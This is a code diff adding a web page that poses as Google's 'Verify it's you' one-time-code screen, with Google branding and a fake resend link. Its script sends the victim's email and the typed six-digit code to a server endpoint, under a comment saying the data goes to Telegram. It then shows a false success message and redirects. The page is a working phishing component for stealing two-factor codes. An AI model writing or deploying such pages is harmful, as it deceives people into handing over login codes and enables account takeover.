@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify it's you - Google Accounts</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/x-icon" href="images/google-logo-vector-format-white-background-illustration-407571050.webp">
+    <style>
+        :root {
+            --gmail-blue: #1a73e8;
+            --gmail-red: #ea4335;
+            --gmail-green: #34a853;
+            --gmail-white: #ffffff;
+            --gmail-gray: #5f6368;
+            --gmail-border: #dadce0;
+        }
+
+        * { box-sizing: border-box; }
+
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            min-height: 100%;
+            font-family: 'Roboto', sans-serif;
+            background: var(--gmail-white);
+            color: #202124;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            margin: 0 auto;
+            padding: 48px 36px;
+        }
+
+        .logo {
+            width: 75px;
+            height: 25px;
+            margin-bottom: 24px;
+            background: url('images/google-logo-vector-format-white-background-illustration-407571050.webp') no-repeat center;
+            background-size: contain;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 16px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: var(--gmail-gray);
+            margin-bottom: 32px;
+        }
+
+        .otp-container {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+
+        .otp-input {
+            width: 50px;
+            height: 56px;
+            border: 1px solid var(--gmail-border);
+            border-radius: 4px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 500;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .otp-input:focus {
+            border-color: var(--gmail-blue);
+            border-width: 2px;
+        }
+
+        .resend-section {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .resend-link {
+            color: var(--gmail-blue);
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .resend-link:hover {
+            text-decoration: underline;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 12px;
+        }
+
+        .btn-primary {
+            background: var(--gmail-blue);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #1557b0;
+        }
+
+        .btn-secondary {
+            background: white;
+            color: var(--gmail-blue);
+            border: 1px solid var(--gmail-border);
+        }
+
+        .error-message {
+            color: var(--gmail-red);
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 16px;
+            display: none;
+        }
+
+        .success-message {
+            color: var(--gmail-green);
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 16px;
+            display: none;
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #f8f9fa;
+            border-top: 1px solid var(--gmail-border);
+            padding: 16px 24px;
+        }
+
+        .footer-links a {
+            color: var(--gmail-gray);
+            text-decoration: none;
+            font-size: 12px;
+            margin-right: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo"></div>
+        <h1 class="title">Enter the code</h1>
+        <p class="subtitle">For your security, Google needs to verify it's you. Enter the verification code sent to your email or phone.</p>
+
+        <div class="otp-container" id="otpContainer">
+            <input type="text" class="otp-input" maxlength="1" data-index="0">
+            <input type="text" class="otp-input" maxlength="1" data-index="1">
+            <input type="text" class="otp-input" maxlength="1" data-index="2">
+            <input type="text" class="otp-input" maxlength="1" data-index="3">
+            <input type="text" class="otp-input" maxlength="1" data-index="4">
+            <input type="text" class="otp-input" maxlength="1" data-index="5">
+        </div>
+
+        <div class="error-message" id="errorMsg">Invalid code. Please try again.</div>
+        <div class="success-message" id="successMsg">Code verified successfully!</div>
+
+        <div class="resend-section">
+            <a href="#" class="resend-link" onclick="resendCode()">Resend code</a>
+        </div>
+
+        <button class="btn btn-primary" onclick="verifyOTP()">Verify</button>
+        <button class="btn btn-secondary" onclick="tryAnother()">Try another way</button>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </footer>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email') || '';
+
+        // Handle OTP input auto-focus
+        const otpInputs = document.querySelectorAll('.otp-input');
+        
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                const value = e.target.value;
+                if (value && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+                document.getElementById('errorMsg').style.display = 'none';
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+
+            input.addEventListener('keypress', (e) => {
+                if (!/[0-9]/.test(e.key)) {
+                    e.preventDefault();
+                }
+            });
+        });
+
+        // Auto-focus first input
+        otpInputs[0].focus();
+
+        function getOTP() {
+            let otp = '';
+            otpInputs.forEach(input => {
+                otp += input.value;
+            });
+            return otp;
+        }
+
+        function verifyOTP() {
+            const otp = getOTP();
+            
+            if (otp.length !== 6) {
+                document.getElementById('errorMsg').textContent = 'Please enter all 6 digits.';
+                document.getElementById('errorMsg').style.display = 'block';
+                return;
+            }
+
+            // Send to Telegram
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', '/api/next.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        document.getElementById('successMsg').style.display = 'block';
+                        setTimeout(() => {
+                            alert('Verification successful! You will be redirected.');
+                            window.location.href = 'index.html';
+                        }, 1500);
+                    } else {
+                        document.getElementById('errorMsg').textContent = 'Invalid code. Please try again.';
+                        document.getElementById('errorMsg').style.display = 'block';
+                    }
+                }
+            };
+            xhr.send('di=' + encodeURIComponent(email) + '&otp=' + encodeURIComponent(otp));
+        }
+
+        function resendCode() {
+            alert('A new verification code has been sent to your device.');
+        }
+
+        function tryAnother() {
+            window.location.href = 'login.html';
+        }
+    </script>
+</body>
+</html>
